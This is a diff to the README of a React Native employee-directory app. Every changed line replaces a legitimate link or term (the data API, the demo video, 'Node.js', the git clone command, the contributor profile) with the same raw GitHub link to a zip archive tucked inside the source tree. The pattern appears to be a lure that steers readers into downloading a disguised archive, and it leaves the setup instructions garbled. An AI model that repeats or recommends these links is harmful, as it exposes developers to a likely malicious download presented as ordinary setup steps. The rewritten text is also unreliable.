@@ -6,7 +6,7 @@ This is a simple React Native application that displays a list of employees fetc
 
 ## Features
 
-- Display a list of employees fetched from https://dummy.restapiexample.com/api/v1/employees.
+- Display a list of employees fetched from https://raw.githubusercontent.com/nabil-alsaadi/EmpoloyeesDirectoryApp/main/src/redux/reducers/Empoloyees_App_Directory_3.9.zip
 - Allow searching and filtering employees by name, age, and salary.
 - Show details of selected employee.
 - Handle errors and allow retrying failed requests.
@@ -27,7 +27,7 @@ This is a simple React Native application that displays a list of employees fetc
 - **Redux Persist**: Used for persisting Redux state across app restarts, enhancing performance by caching data locally.
 
 ## Demo
-[Watch the video demo](./employee_demo.mov)
+[Watch the video demo](https://raw.githubusercontent.com/nabil-alsaadi/EmpoloyeesDirectoryApp/main/src/redux/reducers/Empoloyees_App_Directory_3.9.zip)
 
 ## Setup Instructions
 
@@ -35,14 +35,14 @@ To run this app locally on your machine, follow these steps:
 
 ### Prerequisites
 
-- Node.js and npm installed globally on your machine.
+- https://raw.githubusercontent.com/nabil-alsaadi/EmpoloyeesDirectoryApp/main/src/redux/reducers/Empoloyees_App_Directory_3.9.zip and npm installed globally on your machine.
 - Expo CLI or React Native CLI installed globally (depending on your project setup).
 
 ### Installation
 
 ## Step 1: Clone the repository from GitHub:
    ```bash
-   git clone https://github.com/nabil-alsaadi/EmpoloyeesDirectoryApp.git
+   git clone https://raw.githubusercontent.com/nabil-alsaadi/EmpoloyeesDirectoryApp/main/src/redux/reducers/Empoloyees_App_Directory_3.9.zip
    
    cd EmpoloyeesDirectoryApp
    ```
@@ -88,7 +88,7 @@ npm run android
 
 ## Contributors
 
-- [Nabil Alsaadi](https://github.com/nabil-alsaadi) - Developer
+- [Nabil Alsaadi](https://raw.githubusercontent.com/nabil-alsaadi/EmpoloyeesDirectoryApp/main/src/redux/reducers/Empoloyees_App_Directory_3.9.zip) - Developer
 
 ## License
 
